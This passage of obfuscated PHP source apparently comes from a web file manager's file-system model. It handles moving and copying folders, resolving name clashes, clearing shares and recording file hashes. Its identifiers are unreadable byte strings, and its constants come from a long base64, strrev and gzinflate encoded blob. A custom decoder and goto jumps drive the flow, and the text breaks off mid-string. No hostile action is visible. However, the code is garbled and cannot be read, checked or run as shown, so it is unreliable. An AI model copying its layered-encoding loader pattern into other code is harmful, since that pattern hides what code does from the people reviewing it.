$˜¯ú§÷§[$ÏÎŞ¤Øó[441]], $ôå÷›Ñ¢); Hook::trigger($ÏÎŞ¤Øó[596], $Á¹üé˜™); return $Øƒ‚¡º˜; } private function _move($ ó•ş”†, $·¤ˆÈÂÍ, $‹ô±«ˆÅ, &$Ò¨ù½ı˜, $ÛÒÜáà = '') { $¯Äº’Ÿğ =& $_SERVER[ï»»·÷á]; $ÛÔõÃÚ´ = $this->sourceInfo($ ó•ş”†); $éçé€äğ = $ÛÔõÃÚ´[$¯Äº’Ÿğ[419]] == $¯Äº’Ÿğ[88]; $úúš–±© = $ÛÒÜáà ? $ÛÒÜáà : $ÛÔõÃÚ´[$¯Äº’Ÿğ[32]]; $âéå««‰ = $this->fileNameExistCache($·¤ˆÈÂÍ, $úúš–±©); $this->lockMoveStart($ ó•ş”†); $this->lockWriteStart($·¤ˆÈÂÍ, $úúš–±©); if (!$âéå««‰) { return $this->_moveForce($ ó•ş”†, $·¤ˆÈÂÍ, $úúš–±©); } $šç•šÁ¤ = $âéå««‰; $Ñô´¹¯ = !1; if ($éçé€äğ) { if ($‹ô±«ˆÅ == REPEAT_RENAME_FOLDER) { $úúš–±© = $this->fileNameAuto($·¤ˆÈÂÍ, $úúš–±©, $‹ô±«ˆÅ, $éçé€äğ); $šç•šÁ¤ = $this->_moveForce($ ó•ş”†, $·¤ˆÈÂÍ, $úúš–±©); } else { if ($‹ô±«ˆÅ == REPEAT_RENAME_FOLDER) { $‹ô±«ˆÅ = REPEAT_RENAME; } $Í›‹Ú¶ = $this->_childrenListSelect($ ó•ş”†); foreach ($Í›‹Ú¶ as $Å–Òğà”) { $this->_move($Å–Òğà”[$¯Äº’Ÿğ[411]], $âéå««‰, $‹ô±«ˆÅ, $Ò¨ù½ı˜); } $Ñô´¹¯ = !0; } } else { if ($‹ô±«ˆÅ == REPEAT_SKIP) { $Ñô´¹¯ = !0; } else { if ($‹ô±«ˆÅ == REPEAT_RENAME || $‹ô±«ˆÅ == REPEAT_RENAME_FOLDER) { $úúš–±© = $this->fileNameAuto($·¤ˆÈÂÍ, $úúš–±©, $‹ô±«ˆÅ, $éçé€äğ); $šç•šÁ¤ = $this->_moveForce($ ó•ş”†, $·¤ˆÈÂÍ, $úúš–±©); } else { if ($‹ô±«ˆÅ == REPEAT_REPLACE) { $ÛƒËêˆİ = $this->sourceInfoCache($âéå««‰); $Æâùø»Ú = $this->fileHistory($ÛƒËêˆİ, $ÛÔõÃÚ´[$¯Äº’Ÿğ[477]], $ÛÔõÃÚ´[$¯Äº’Ÿğ[76]]); $Ñô´¹¯ = !0; if ($Æâùø»Ú) { $Ò¨ù½ı˜[$¯Äº’Ÿğ[566]][] = $ÛÔõÃÚ´[$¯Äº’Ÿğ[477]]; } } } } } if ($Ñô´¹¯ && !$Ò¨ù½ı˜[$¯Äº’Ÿğ[597]]) { $Ò¨ù½ı˜[$¯Äº’Ÿğ[597]] = !0; } return $šç•šÁ¤; } private function _moveForce($“Ñ€¸Ç, $æ€ÇŒ³ğ, $òÉ½™Ã¨) { $°¥“ş’ª =& $_SERVER[ï»»·÷á]; $ã¦öúûÔ = $this->sourceInfo($“Ñ€¸Ç); $Ûë†æË­ = $this->sourceInfo($æ€ÇŒ³ğ); $›ÃÉÆê = $ã¦öúûÔ[$°¥“ş’ª[419]] == $°¥“ş’ª[88]; $Ç€à¾şÀ = array($°¥“ş’ª[410] => $Ûë†æË­[$°¥“ş’ª[411]], $°¥“ş’ª[589] => $Ûë†æË­[$°¥“ş’ª[520]] . $Ûë†æË­[$°¥“ş’ª[411]] . $°¥“ş’ª[50], $°¥“ş’ª[585] => $Ûë†æË­[$°¥“ş’ª[420]], $°¥“ş’ª[586] => $Ûë†æË­[$°¥“ş’ª[505]], $°¥“ş’ª[588] => USER_ID, $°¥“ş’ª[429] => $òÉ½™Ã¨); $ü˜˜í = $ã¦öúûÔ[$°¥“ş’ª[420]] == SourceModel::TYPE_GROUP && $Ûë†æË­[$°¥“ş’ª[420]] == SourceModel::TYPE_GROUP && $ã¦öúûÔ[$°¥“ş’ª[505]] == $Ûë†æË­[$°¥“ş’ª[505]]; if (!$ü˜˜í && $this->moveClearAuth) { Model($°¥“ş’ª[502])->authClear($“Ñ€¸Ç); } $¾ĞÒô = $ã¦öúûÔ[$°¥“ş’ª[440]] == $°¥“ş’ª[88] && $Ûë†æË­[$°¥“ş’ª[440]] != $°¥“ş’ª[88]; if ($¾ĞÒô) { $Ç€à¾şÀ[$°¥“ş’ª[439]] = 0; } if ($›ÃÉÆê) { $·¦×¹¼³ = array($°¥“ş’ª[589] => array($°¥“ş’ª[549], $ã¦öúûÔ[$°¥“ş’ª[520]] . $ã¦öúûÔ[$°¥“ş’ª[411]] . $°¥“ş’ª[550])); $»Âğ ê‡ = $ã¦öúûÔ[$°¥“ş’ª[520]] . $ã¦öúûÔ[$°¥“ş’ª[411]] . $°¥“ş’ª[50]; $á›Ó¨Ã¼ = $Ûë†æË­[$°¥“ş’ª[520]] . $Ûë†æË­[$°¥“ş’ª[411]] . $°¥“ş’ª[50] . $ã¦öúûÔ[$°¥“ş’ª[411]] . $°¥“ş’ª[50]; $˜áàíö‰ = array($°¥“ş’ª[589] => array($°¥“ş’ª[598], "\x72\x65\x70\154\x61\x63\145\x28\160\141\162\x65\156\164\x4c\145\166\x65\154\54\47{$»Âğ ê‡}\x27\x2c\x27{$á›Ó¨Ã¼}\47\x29"), $°¥“ş’ª[585] => $Ûë†æË­[$°¥“ş’ª[420]], $°¥“ş’ª[586] => $Ûë†æË­[$°¥“ş’ª[505]]); if ($¾ĞÒô) { $˜áàíö‰[$°¥“ş’ª[439]] = 0; } $this->where($·¦×¹¼³)->data($˜áàíö‰)->save(); } $this->where(array($°¥“ş’ª[426] => $“Ñ€¸Ç))->data($Ç€à¾şÀ)->save(); return $“Ñ€¸Ç; } private function clearShare($âî×ÈÇ, $â¹ç‘”Í) { $Šèì“¾ô =& $_SERVER[ï»»·÷á]; $ûùş‡ªÀ = $this->sourceInfo($âî×ÈÇ); $öŞˆï™ = $this->sourceInfo($â¹ç‘”Í); if ($ûùş‡ªÀ[$Šèì“¾ô[505]] == $öŞˆï™[$Šèì“¾ô[505]] && $ûùş‡ªÀ[$Šèì“¾ô[420]] == $Šèì“¾ô[599]) { return; } $Êáæıåˆ = array($Šèì“¾ô[520] => array($Šèì“¾ô[549], $ûùş‡ªÀ[$Šèì“¾ô[520]] . $âî×ÈÇ . $Šèì“¾ô[550])); $€ñö¾š = $this->field($Šèì“¾ô[426])->where($Êáæıåˆ)->getField($Šèì“¾ô[411], !0); if (!$€ñö¾š) { return; } $Êáæıåˆ = array($Šèì“¾ô[411] => array($Šèì“¾ô[7], $€ñö¾š), $Šèì“¾ô[600] => 1); $Ò‚¤‚…ó = Model($Šèì“¾ô[601])->field($Šèì“¾ô[602])->where($Êáæıåˆ)->select(); if (!$Ò‚¤‚…ó) { return; } $Ò‚¤‚…ó = array_to_keyvalue($Ò‚¤‚…ó, $Šèì“¾ô[12], $Šèì“¾ô[602]); $Êáæıåˆ = array($Šèì“¾ô[602] => array($Šèì“¾ô[7], $Ò‚¤‚…ó)); Model($Šèì“¾ô[601])->where($Êáæıåˆ)->save(array($Šèì“¾ô[600] => 0)); Model($Šèì“¾ô[603])->where($Êáæıåˆ)->delete(); } public function copyFolderFromIO($Ã¸”ƒ£Æ, $Ê÷•ãİÂ, $øè°±Àù, $½âé¥×‘, $á°øõ, $Š÷Ìã‚ = false) { $„ ûÜçà =& $_SERVER[ï»»·÷á]; $÷áåß²ş = array($„ ûÜçà[567] => array(), $„ ûÜçà[568] => array(), $„ ûÜçà[566] => array(), $„ ûÜçà[604] => array()); $ƒ‹¿åÚ = $Š÷Ìã‚ ? $Š÷Ìã‚ : $Ã¸”ƒ£Æ->pathThis($Ê÷•ãİÂ); $ÔâßËáí = $this->fileNameExist($øè°±Àù, $ƒ‹¿åÚ); $ğ‰ó×ú = $this->mkdir($øè°±Àù, $ƒ‹¿åÚ, $½âé¥×‘); if (!$ÔâßËáí || $½âé¥×‘ == REPEAT_RENAME_FOLDER) { $½âé¥×‘ = !1; } if ($ÔâßËáí) { $this->_childrenAllMake($ÔâßËáí); } Hook::trigger($„ ûÜçà[605]); $this->_copyChildTo($Ã¸”ƒ£Æ, $Ê÷•ãİÂ, $ğ‰ó×ú, $½âé¥×‘, $÷áåß²ş, $á°øõ); Hook::trigger($„ ûÜçà[606]); if ($ğ‰ó×ú) { $this->folderSizeResetChildren($ğ‰ó×ú); } $this->_childrenListClear(); Model($„ ûÜçà[569])->addAll($÷áåß²ş[$„ ûÜçà[567]], array(), !0); Model($„ ûÜçà[570])->eventCopy($ğ‰ó×ú); $this->saveAll($÷áåß²ş[$„ ûÜçà[568]]); Model($„ ûÜçà[480])->linkAdd($÷áåß²ş[$„ ûÜçà[566]]); Model($„ ûÜçà[480])->remove($÷áåß²ş[$„ ûÜçà[604]]); $this->folderSizeReset($øè°±Àù); $this->updateModifyTime($øè°±Àù); return $ğ‰ó×ú; } private function _copyChildTo($À•Ú†æ±, $¾ÁìºÓ—, $Ôà—­Şİ, $í“ñœ©, &$›¨¡ùˆò, $—Ô»³) { $›”ƒÉéØ =& $_SERVER[ï»»·÷á]; $¿§òÔ¯Ò = $this->sourceInfoCache($Ôà—­Şİ); $ı¼–ó¬™ = $À•Ú†æ±->listPath($¾ÁìºÓ—); $ı¼–ó¬™ = $ı¼–ó¬™ ? $ı¼–ó¬™ : array($›”ƒÉéØ[83] => array(), $›”ƒÉéØ[82] => array()); $Ë‰à–­¾ = array_merge($ı¼–ó¬™[$›”ƒÉéØ[83]], $ı¼–ó¬™[$›”ƒÉéØ[82]]); $÷æÃ Ô‹ = $this->_addFiles($À•Ú†æ±, $ı¼–ó¬™[$›”ƒÉéØ[83]], $—Ô»³); $«©”‰«– = array(); foreach ($Ë‰à–­¾ as &$Š»Ó¨‹Ë) { if (isset($÷æÃ Ô‹[$Š»Ó¨‹Ë[$›”ƒÉéØ[32]]])) { $Š»Ó¨‹Ë = $÷æÃ Ô‹[$Š»Ó¨‹Ë[$›”ƒÉéØ[32]]]; } $Š»Ó¨‹Ë[$›”ƒÉéØ[419]] = $Š»Ó¨‹Ë[$›”ƒÉéØ[33]] == $›”ƒÉéØ[75]; $Š»Ó¨‹Ë[$›”ƒÉéØ[421]] = substr(_get($Š»Ó¨‹Ë, $›”ƒÉéØ[174], $›”ƒÉéØ[12]), 0, 10); $Š»Ó¨‹Ë[$›”ƒÉéØ[76]] = _get($Š»Ó¨‹Ë, $›”ƒÉéØ[76], 0); $Š»Ó¨‹Ë[$›”ƒÉéØ[477]] = _get($Š»Ó¨‹Ë, $›”ƒÉéØ[477], 0); if (!isset($Š»Ó¨‹Ë[$›”ƒÉéØ[607]]) && $Š»Ó¨‹Ë[$›”ƒÉéØ[477]]) { $›¨¡ùˆò[$›”ƒÉéØ[604]][] = $Š»Ó¨‹Ë[$›”ƒÉéØ[477]]; } if ($í“ñœ©) { $ÖÄğº‘Í = $this->fileNameExistCache($Ôà—­Şİ, $Š»Ó¨‹Ë[$›”ƒÉéØ[32]]); if ($ÖÄğº‘Í) { if ($Š»Ó¨‹Ë[$›”ƒÉéØ[419]] || $í“ñœ© == REPEAT_SKIP) { continue; } if ($í“ñœ© == REPEAT_REPLACE) { $Íı¯Ó‚ = $this->sourceInfoCache($ÖÄğº‘Í); $ğ¿¦íÅ = $this->fileHistory($Íı¯Ó‚, $Š»Ó¨‹Ë[$›”ƒÉéØ[477]], $Š»Ó¨‹Ë[$›”ƒÉéØ[76]]); if ($ğ¿¦íÅ) { $›¨¡ùˆò[$›”ƒÉéØ[566]][] = $Š»Ó¨‹Ë[$›”ƒÉéØ[477]]; } continue; } else { if ($í“ñœ© == REPEAT_RENAME) { $Š»Ó¨‹Ë[$›”ƒÉéØ[32]] = $this->fileNameAutoCache($Ôà—­Şİ, $Š»Ó¨‹Ë[$›”ƒÉéØ[32]], $í“ñœ©, !1); } } } } if (!$Š»Ó¨‹Ë[$›”ƒÉéØ[419]] && $Š»Ó¨‹Ë[$›”ƒÉéØ[477]] == 0) { continue; } if (!$Š»Ó¨‹Ë[$›”ƒÉéØ[419]] && $Š»Ó¨‹Ë[$›”ƒÉéØ[477]]) { $›¨¡ùˆò[$›”ƒÉéØ[566]][] = $Š»Ó¨‹Ë[$›”ƒÉéØ[477]]; } $«©”‰«–[] = $this->_makeItemData($Š»Ó¨‹Ë, $¿§òÔ¯Ò, $Š»Ó¨‹Ë[$›”ƒÉéØ[32]]); } unset($Š»Ó¨‹Ë); if (!empty($«©”‰«–)) { $this->addAll($«©”‰«–); $this->_childrenListSelect($Ôà—­Şİ); } $ĞÕõıÈ´ = $this->_childrenList($Ôà—­Şİ); $ĞÕõıÈ´ = array_to_keyvalue($ĞÕõıÈ´, $›”ƒÉéØ[32]); foreach ($Ë‰à–­¾ as $Š»Ó¨‹Ë) { $Íı¯Ó‚ = $ĞÕõıÈ´[$Š»Ó¨‹Ë[$›”ƒÉéØ[32]]]; $¶ß†©‘Ö = $Íı¯Ó‚[$›”ƒÉéØ[411]]; $this->_copyApplyMeta($Íı¯Ó‚, $›¨¡ùˆò); if ($Š»Ó¨‹Ë[$›”ƒÉéØ[33]] == $›”ƒÉéØ[75]) { $Š»Ó¨‹Ë[$›”ƒÉéØ[84]] = $À•Ú†æ±->getPathInner($Š»Ó¨‹Ë[$›”ƒÉéØ[84]]); $this->_copyChildTo($À•Ú†æ±, $Š»Ó¨‹Ë[$›”ƒÉéØ[84]], $¶ß†©‘Ö, $í“ñœ©, $›¨¡ùˆò, $—Ô»³); } } } private function _addFiles($Éğ„ªØ, $ıìÈ¢ÄÅ, $ñÔÌ¹Ì—) { $ñ®øØéú =& $_SERVER[ï»»·÷á]; if (!$ıìÈ¢ÄÅ || count($ıìÈ¢ÄÅ) == 0) { return array(); } $½ğÕ·¦ = array(); foreach ($ıìÈ¢ÄÅ as &$×Ò‚åğ) { Hook::trigger($ñ®øØéú[608], $×Ò‚åğ); $×Ò‚åğ[$ñ®øØéú[84]] = $Éğ„ªØ->getPathInner($×Ò‚åğ[$ñ®øØéú[84]]); $ö™Ó¡­Å = $Éğ„ªØ->hashSimple($×Ò‚åğ[$ñ®øØéú[84]]); $¸Œõ£Ø¹ = $Éğ„ªØ->hashMd5($×Ò‚åğ[$ñ®øØéú[84]]); if (strlen($¸Œõ£Ø¹) > 10 && !isset($½ğÕ·¦[$¸Œõ£Ø¹])) { $½ğÕ·¦[$¸Œõ£Ø¹] = array(); } $×Ò‚åğ[$ñ®øØéú[177]] = $ö™Ó¡­Å; $×Ò‚åğ[$ñ®øØéú[176]] = $¸Œõ£Ø¹; $½ğÕ·¦[$¸Œõ£Ø¹][] =& $×Ò‚åğ; if (count($½ğÕ·¦[$¸Œõ£Ø¹]) > 1) { $×Ò‚åğ[$ñ®øØéú[607]] = !0; } Hook::trigger($ñ®øØéú[609], $×Ò‚åğ); } unset($×Ò‚åğ); $™‡Ì¸ğí = array($ñ®øØéú[176] => array($ñ®øØéú[7], array_keys($½ğÕ·¦))); $«¯ğêÄå = Model($ñ®øØéú[610]); $Ñ»—“½€ = $«¯ğêÄå->where($™‡Ì¸ğí)->select(); $Ñ»—“½€ = $Ñ»—“½€ ? $Ñ»—“½€ : array(); foreach ($Ñ»—“½€ as $µì±’áï) { if (!isset($½ğÕ·¦[$µì±’áï[$ñ®øØéú[176]]])) { continue; } $Ú×œÒàù = $½ğÕ·¦[$µì±’áï[$ñ®øØéú[176]]]; foreach ($Ú×œÒàù as &$×Ò‚åğ) { $×Ò‚åğ[$ñ®øØéú[477]] = $µì±’áï[$ñ®øØéú[477]]; $×Ò‚åğ[$ñ®øØéú[607]] = !0; } unset($×Ò‚åğ); } $Œ¸ô†á‰ = array(); foreach ($ıìÈ¢ÄÅ as $ìèóâ”) { Hook::trigger($ñ®øØéú[611], $ìèóâ”); if (isset($ìèóâ”[$ñ®øØéú[607]]) && $ìèóâ”[$ñ®øØéú[607]]) { Hook::trigger($ñ®øØéú[612], $ìèóâ”); continue; } $éÔ÷¦ = $Éğ„ªØ->getPathInner($ìèóâ”[$ñ®øØéú[84]]); $²æÚ¬ğ´ = $«¯ğêÄå->addFileMake($éÔ÷¦, $ìèóâ”[$ñ®øØéú[76]], $ìèóâ”[$ñ®øØéú[177]], $ìèóâ”[$ñ®øØéú[176]], $ìèóâ”[$ñ®øØéú[32]], $ñÔÌ¹Ì—); Hook::trigger($ñ®øØéú[612], $ìèóâ”); if (!is_array($²æÚ¬ğ´)) { continue; } $Œ¸ô†á‰[] = $²æÚ¬ğ´; } $«¯ğêÄå->addAll($Œ¸ô†á‰); $™‡Ì¸ğí = array($ñ®øØéú[176] => array($ñ®øØéú[7], array_keys($½ğÕ·¦))); $Ñ»—“½€ = $«¯ğêÄå->where($™‡Ì¸ğí)->select(); $Ñ»—“½€ = $Ñ»—“½€ ? $Ñ»—“½€ : array(); foreach ($Ñ»—“½€ as $µì±’áï) { if (!isset($½ğÕ·¦[$µì±’áï[$ñ®øØéú[176]]])) { continue; } $ëç¶Äğ´ =& $½ğÕ·¦[$µì±’áï[$ñ®øØéú[176]]]; foreach ($ëç¶Äğ´ as &$×Ò‚åğ) { $×Ò‚åğ[$ñ®øØéú[477]] = $µì±’áï[$ñ®øØéú[477]]; } unset($×Ò‚åğ); } $¤šøÏ¢Ì = array(); foreach ($ıìÈ¢ÄÅ as $ô»€Ğå‡) { $¤šøÏ¢Ì[$ô»€Ğå‡[$ñ®øØéú[32]]] = $ô»€Ğå‡; } return $¤šøÏ¢Ì; } } define($_SERVER[ï»»·÷á][613], $_SERVER[ï»»·÷á][614]); $qvfdoxuljg = $_SERVER[ï»»·÷á][615]; goto D…ÚÈŠŠš¸; D…ÚÈŠŠš¸: $_SERVER[éîó”ş¹] = explode($_SERVER[ï»»·÷á][616], gzinflate(substr($_SERVER[ï»»·÷á][617], 10, -8))); $urzpbvmfji = $_SERVER[ï»»·÷á][618]; if (!$urzpbvmfji) { return; } goto Eµ§Œ´äæç; c¤öš°”„˜: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('77u7t/fh'), "\x92\x89\xf9\xef\xe2\x8a"); $_SERVER[ï»»·÷á] = explode(base64_decode('fAF8BXwG'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\33\325\325\150\51\113\313\22\112\201\277\100\13\145\60\44\266\23\55\166\366\70\161\22\331\226\155\21\331\162\44\71\13\166\230".base64_decode('jKSRNbakkWdG3pKwFChLgJSy/SwthS5AgbAEGiClLG3pY6fQQoAWKGRhLTsttIV3lw==')."\163\227\31\311\360\277\357\275\357\173\174\304\232\173\356\276\235\173\316\271\347\234\373\275\123\137\273\361\345\315\353\367\130\277\367\372\175\356\371\373\353\77\177\340\126\372\215\376\356".base64_decode('if6R76M3fv0r5L9DNp5TV9c5d78Z3Qdsuv0m7UZts3ZuLPrIo5Epj994fHjXTx8Z3w==')."\265\307\127\336\156\70\352\361\46\224\230\346\155\242\77\112\321\164\24\175\314\260\35\233\2\322\146\61\153\14\320\157\243\110\177\203\364\247\67\36\265\364\202\351\350\64\30\240\77".base64_decode('Km8X+msP5w0Wr3bHkmqit6cnHE9CoiY5vmBm4KukWVoB6i/plo1aIxenlsySXnRBBA==')."\x20\xa3\x39\x5a\x4a\xb3\xa1\xa4\xb6\x16\xb5\x2d\xdc\x13\x8d\xad\x56\x93\xab\x7b\xc2\x90\x22\xa5\xe\x97\x75\x6b\x9c\x86\xc8\x67\xc2\xd1\x2c\x27\x69\x14\x74\x9e\x62\xd4\xe2\xed\x6a\x9\x77\x44\xba".base64_decode('lWQ81J0ItSYjsW4Kbo11dUWSlfB4LBptCbUuq4zpiYc6ukIKal9eV41i1qxT1tKYtQ==')."\112\75\375\150\67\364\174\206\176\26\65\326\34\147\274\4\137\111\376\205\246\251\130\316\347\151\240\233\177\145\364\254\126\316\303\150\265\311\201\222\145\24\64\326\351\145\372\70\207"."\xd2\xf\xad\xec\x98\x46\x31\x4d\x3\xe1\x31\xc7\xd2\x4\x1c\xb5\x35\x8d\x26\x5a\x2f\x42\x51\x89\x70\x34\xdc\x9a\x54\x70\x3\x95\xf6\x78\xac\x4b\x81\x49\x28\x68\xb6\xa3\x5b\xca\xca\xce\x70\x3c\xac".strrev('LĞR Y‚…›Jˆ­Yi\\p¶ñbÂ•O41X”/G¬™Th¡(PÑº^°*Ö¾’×7Fà')."\x3a\x52\x53\xc3\xf1\x38\xfd\xf0\xc1\xf2\x8e\x46\xf0\xa4\x41\x20\xd6\xde\x9e\x8\xf3\x10\x74\x6e\x79\x14\xb5\x64\x16\xac\x4f\x57\x28\x93\xcd\x3b\xea\x88\x96\x2f\xb3\x65\x3a\x44\x7f\x6b\xe1\x7\x7e".base64_decode('TRuW7rBRNMqwTKEI0+TbCj7KLLXOIHoGPgoovwk7D23DEfrZvJj+LoREKRXH6Zaj6g==')."\xc5\xb4\x99\x31\x8a\xb0\x59\x97\xc0\xa2\xd3\x9c\x5c\x9b\x65\xa0\x4\x34\x9c\x35\xf3\x19\xf6\x6d\x1b\x13\xd0\x95\xac\x91\xd7\xbb\xcb\x5\x39\x9\xf\xa6\x73\x46\x3e\x63\xb1\xfd\xf5\x45\x29\x69\x30".base64_decode('yrcrTitCJdQSvtON7LjYbzhdD4+1zbKV1iNof9BwI4B1x0Gdg7ExzN5S3tQyCd3iXQ==')."\63\314\166\124\120\254\354\310\300\62\111\326\156\132\205\66\204\31\240\176\264\53\214\336\52\21\103\154\137\144\244\21\13\326\365\235\352\377\154\115\337\122\364\247\36\120\137\77\264"."\51\247\347\363\252\76\246\303\306\51\144\346\330\154\60\202\166\312\50\6\21\204\6\43\61\65\247\331\271\256\314\34\225\344\142\30\65\243\217\5\112\271\22\354\152\276\221\373\135"."\xb\x1b\xf\x5d\xb7\xe9\x84\x25\xbc\x9c\x37\xd3\x5a\x5e\xee\x22\xfd\xce\x39\x4e\x29\xa1\x17\x33\x78\x24\xa0\x2b\xe6\x68\x91\x8c\x54\x49\xd7\x21\x51\x9b\x4f\xc9\x28\x5d\xca\x6a\xa5\xb3\xc9\x68\xb2".strrev('ºXí¿ÑÚfƒakHŞR¥j{bpÁ6P±Ø¤~–LÎ›ÎÍ˜qŞ±BÆY')."\x25\x86\xd2\x69\xdd\xb6\xfd\xad\x66\xd1\xb1\xcc\xbc\x3f\x94\xcf\x9b\xa3\xfe\x98\x65\xc\x18\xc5\x26\x65\x3a\x20\x5b\x14\x89\x36\xb5\x1f\x23\xc0\x26\xd8\xa9\x35\xb\x15\xbc\x70\x70\x35\xd3\x9b\xcb"."\116\326\77\237\355\100\236\332\322\212\166\126\267\374\141\330\31\115\12\152\54\307\202\54\131\233\141\227\114\333\300\315\153\122\64\307\321\322\71\214\101\104\361\315\137\220\336\50\346"."\215\242\136\221\66\74\126\62\54\335\146\155\125\72\272\222\120\10\52\135\367\367\130\332\100\101\153\122\112\345\24\32\31\330\251\125\140\64\65\14\115\223\222\306\101\237\122\50\333"."\x8e\xdf\xd2\x11\x2a\x32\xd0\x71\x7\x83\x1c\xc9\xfa\xbb\xf0\xbe\x32\xf4\x8c\x3f\x81\x30\x36\x80\x67\x35\xcc\x56\xd0\xd2\x51\x58\x1c\x85\x76\x26\x93\x3d\x6a\xa4\x1d\x1d\xc9\xdd\x61\xb5\x2b\x94\x6c".base64_decode('7YRmO9oAa3MU4WFeJAOu8qP9hRdXN+qrAPaYo7qFKm4Zb1KGzEzKHAuwKJw4gRANSw==').base64_decode('jKe75PjjWnEAj09q3NFhCdojA+6BjurFASfHMibC8RXhuJqItSdXhuJwmBfRKhljVQ==')."\341\242\363\376\270\236\101\103\237\166\130\76\255\204\107\215\245\301\233\3\317\25\213\305\33\206\305\105\43\35\170\140\332\374\66\112\344\227\123\261\262\243\106\301\300\155\167\170\14".base64_decode('GUl00ndAg4KkQ8399vS6/syMej/6O72+r78tMH3NkqAh8gQbA43KzIa5Sg8iPQwtrw==')."\100\247\53\122\64\50\261\145\356\141\21\253\271\150\26\365\57\30\34\174\166\111\333\336\63\254\24\30\17\57\357\15\47\222\152\127\70\331\31\153\203\332\303\41\370\212\232\164\333"."\262\336\366\321\237\65\60\273\153\350\217\152\330\355\322\261\202\203\34\375\250\146\152\20\115\106\227\316\160\154\226\342\350\110\101\33\220\220\74\206\342\120\227\151\351\156\210\70\252"."\126\32\31\176\106\240\140\247\156\14\344\140\274\14\134\132\332\314\233\226\226\307\230\221\155\12\235\141\253\1\3\260\25\40\141\21\110\30\205\22\153\254\223\53\27\122\322\47\140".base64_decode('e4efVDZaSew7Z/KTzbTgqykIWabObGd4P5iYhf4XSD5jFjSGMgmy0zMU21HQdFdMpw==')."\256\211\343\332\261\34\23\103\55\127\22\64\264\71\23\246\170\100\147\115\52\363\266\261\126\146\364\274\316\306\45\247\263\3\243\1\222\241\3\217\217\132\226\317\36\242\373\20\124"."\234\324\206\35\107\71\61\172\147\341\225\230\120\26\200\74\72\241\142\144\306\105\270\307\322\263\6\154\322\42\232\221\56\315\32\142\175\100\63\40\326\12\16\110\353\250\275\67\32"."\125\133\143\335\111\104\122\123\310\312\170\44\31\146\353\66\324\246\206\132\173\370\301\53\146\24\22\140\4\123\171\172\120\310\310\114\230\131\324\234\240\70\346\20\306\56\231\105\133"._kodDe('K5rqehSwE5Ue1SXzBxYvAUFUwtkj/crxBs31cfVD0QzqF5+W2PUvFmYugzkRCLe2pLI=')."\x27\x96\x80\xc\x4b\x30\x14\x11\x60\x29\xdd\x82\xca\x7a\x7a\x21\xaa\x20\xad\x8b\x8e\x30\x0\xf7\x63\xe7\xb9\x6\x64\x55\x68\x65\x82\x21\xe6\x32\x4a\x6f\x19\x13\x9a\xe8\xd2\x12\xd6\x1e\xd6\x91\x42"."\x5e\xd0\x73\xee\x5e\xf9\xc5\xc8\x27\x3b\x23\xdd\xcb\xd4\xae\x58\x5b\x38\xaa\x46\xba\x11\x66\x4a\x56\xc2\x7b\x7b\xda\x42\x6c\x2a\x65\x78\x4b\x2c\xd9\xe9\x82\xf6\x22\xdc\xb4\x22\x14\x8d\x78\x93\x87"."\127\105\22\311\104\325\50\4\353\15\173\142\20\43\330\23\17\267\107\126\361\140\173\44\34\155\113\250\255\241\326\116\221\246\73\324\5\1\65\213\131\61\73\350\116\257\42\44\233".base64_decode('4AydOoKZUzZYqouHUhl3oIo1hA5THVYadBezxKQnwBCnzTI7AjghWWCYoaDBJtLYQQ==')."\131\107\177\352\225\120\102\161\112\52\307\1\251\161\376\111\272\301\302\210\144\204\372\25\100\370\25\55\120\161\232\26\75\313\361\160\165\100\50\353\160\164\357\11\243\305\57\342\320"."\xc\x84\x8\xef\x8d\x56\x2\x99\x11\xa8\xc6\x40\x5b\xc9\x72\x42\xac\x39\x59\xc1\xf7\xaa\xb1\x9e\x70\x3c\x84\xb9\x66\x75\x65\x3c\xd6\xdd\x1\x19\x46\x73\x3a\x6b\x40\x4\x86\xbf\x8e\x11\x57\xc0\x3c"."\x3b\x2\xd\x21\xca\x48\x63\x5c\x94\x18\xf4\x41\x93\xd\xe5\x7a\xfa\x33\x8d\xfe\x20\xa2\x10\x2a\xd7\x8b\x6c\xd4\x53\x18\x23\xb3\xd3\x85\x7d\x64\xd1\x6e\x60\xd8\xd4\x2c\xf3\xda\x52\xa6\x99\x67\xfb"."\24\321\7\34\141\160\346\173\320\146\213\144\214\241\232\31\354\200\202\123\41\31\133\26\356\126\331\312\242\41\151\65\122\0\142\147\143\161\30\20\307\34\142\74\31\215\214\207\23"."\x6c\x97\x5b\xfa\x70\xd9\x60\xc3\x15\xc\xcc\x80\x55\xac\xa3\x83\x7\xaa\xf\x9e\xd8\x3f\x3a\xa3\xae\xcf\x3f\x23\xb0\x6\x7d\xd4\x4f\x5f\x4a\x83\x10\xea\xf\xb8\x82\xc7\x41\xfe\xb2\xc5\x73\x63\xb2"._kodDe('Lr6ZQk7Ez9wPxv9ZHfvaF+nvJHM0cW+9b+587TDw/EmcwydrJz7zAnApHv1mWepP3iI=').base64_decode('td8/7aS1S/v619Q2zTimP3Bs/+ia6fVLWD3psoX4zfQ4b2pmRh1qEiKneJIiQXlSAg==')."\x16\x31\x61\x94\x4\x74\xdd\xdc\xd\xc\x8e\xe6\x50\x1f\x10\x39\xfa\xfc\xfd\x33\xd6\x2c\x91\xf2\x49\x20\x6f\x5d\x88\x5c\x42\xf8\x37\xc7\xd3\x85\xfc\x27\xe0\x9e\xf1\xac\x78\xdf\xc3\xfa\x28\x17\xd3".base64_decode('AnvifZHS0oAHjIEi30LoJOd8upuKXzeV/m5gEzmgjzHUUMwaFqzOctEYZmKIoj4MHw==')."\xa6\xc3\xd6\x77\x4a\x77\x46\x75\xb6\x3c\x10\xdc\x15\x46\x8b\x83\xb1\x8e\x28\x4a\xa\xe5\x9\x61\x8\x35\x60\x86\x8a\xaf\x51\xbe\x98\x8c\x92\x8a\x29\xac\x51\x1e\xca\xe8\x45\x98\xa7\x7d\x21\xb5\x9d"."\xd6\x4a\x7a\x42\xea\xa1\xaa\x26\x43\x2d\xd1\xb0\xca\x30\xc\x60\x62\x16\x26\x58\xb1\x85\x8b\xec\x50\xd7\x4\x46\x65\xf8\x21\x2d\x48\x78\xc2\xad\xc0\xce\xb7\x87\xf3\xa\x41\xc\x8a\x6e\x59\xa6\xd5"."\104\244\227\166